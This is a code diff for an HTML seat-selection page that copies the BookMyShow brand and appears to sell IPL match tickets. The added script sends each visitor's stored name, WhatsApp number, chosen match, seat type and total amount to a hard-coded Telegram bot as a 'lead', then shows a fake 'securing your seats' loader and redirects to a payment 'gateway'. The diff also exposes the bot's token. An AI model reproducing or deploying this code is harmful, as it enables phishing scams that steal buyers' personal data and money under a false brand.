@@ -5,9 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Select Seats</title>
 
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
     <script>
     !function(f,b,e,v,n,t,s)
     {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -28,6 +25,9 @@
     </noscript>
     
     <link rel="stylesheet" href="css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
     <style>
         body { font-family: 'Inter', sans-serif; background: #f4f7f9; margin: 0; color: #111827; }
         
@@ -58,7 +58,7 @@
         
         .card-left { text-align: left; }
         .type-card h3 { margin: 0; font-size: 15px; color: #1e293b; font-weight: 700; display: flex; align-items: center; gap: 8px;}
-        .type-card p { margin: 0; font-weight: 800; color: #f84464; font-size: 18px; } /* Set color to match screenshot */
+        .type-card p { margin: 0; font-weight: 800; color: #f84464; font-size: 18px; } 
         
         /* Features/Benefits List */
         .benefits { margin: 6px 0 0 0; padding: 0; list-style: none; font-size: 11px; color: #64748b; }
@@ -100,7 +100,7 @@
         .book-now-btn.active:hover { transform: translateY(-2px); }
 
         /* 🔥 OFFICIAL BMS FOOTER CSS 🔥 */
-        .official-footer-container { font-family: 'Inter', sans-serif; width: 100%; padding-bottom: 90px; margin-top: 30px;} /* Extra padding for bottom-bar */
+        .official-footer-container { font-family: 'Inter', sans-serif; width: 100%; padding-bottom: 90px; margin-top: 30px;} 
         .know-more-section { background-color: #f2f2f2; padding: 16px 20px; display: flex; justify-content: space-between; align-items: center; color: #888888; font-size: 13px; font-weight: 500; }
         .main-official-footer { background-color: #333333; padding: 40px 20px; text-align: center; }
         .logo-bms-center { display: flex; align-items: center; justify-content: center; gap: 20px; margin-bottom: 35px; }
@@ -364,4 +364,59 @@
                 loader.innerHTML = `
                     <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.95); z-index:99999; display:flex; flex-direction:column; justify-content:center; align-items:center; backdrop-filter:blur(5px);">
                         <div style="width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #00cf7f; border-radius: 50%; animation: load-spin 1s linear infinite;"></div>
-                        <h3 style=
+                        <h3 style="margin-top:20px; color:#333; font-family:sans-serif; font-size:18px; font-weight:700;">Securing Your Seats...</h3>
+                        <p style="color:#666; font-size:13px; margin-top:5px; font-weight:500;">Please wait, redirecting to gateway</p>
+                        <style>@keyframes load-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+                    </div>
+                `;
+                document.body.appendChild(loader);
+
+                const name = localStorage.getItem('customerName') || "Unknown";
+                const phone = localStorage.getItem('customerPhone') || "Unknown";
+                const matchTitle = document.getElementById('match-title').innerText || "IPL Match";
+                const seatType = document.getElementById('res-type').innerText;
+                const totalAmt = window.sQty * window.sPrice;
+
+                const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
+                const chatId = "6820660513"; 
+                
+                const telegramMsg = `💰 LEAD REACHED PAYMENT PAGE! 💰\n\n👤 Name: ${name}\n📞 WhatsApp: ${phone}\n🏏 Match: ${matchTitle}\n🎟️ Seats: ${window.sQty} x ${seatType}\n💵 Total Amount: ₹${totalAmt}`;
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}`;
+
+                fetch(url).then(() => {
+                    window.location.href = "details.html";
+                }).catch(() => {
+                    window.location.href = "details.html";
+                });
+
+                setTimeout(() => {
+                    window.location.href = "details.html";
+                }, 1200);
+
+            } else {
+                alert("Kripya pehle seat type select karein!");
+            }
+        };
+    </script>
+
+    <script type="module">
+        import { db, ref, onValue } from './js/firebase.js';
+        
+        onValue(ref(db, 'settings/payment'), (snap) => {
+            if (snap.exists()) {
+                const settings = snap.val();
+                const globalFooterLogo = settings.globalFooterLogo || '';
+                const footerLogoImg = document.getElementById('dynamic-footer-logo');
+                if (footerLogoImg && globalFooterLogo.trim() !== "") {
+                    footerLogoImg.src = globalFooterLogo;
+                    footerLogoImg.style.display = 'block';
+                }
+            }
+        });
+    </script>
+
+    <script type="module" src="js/seats.js"></script>
+
+</body>
+</html>
+
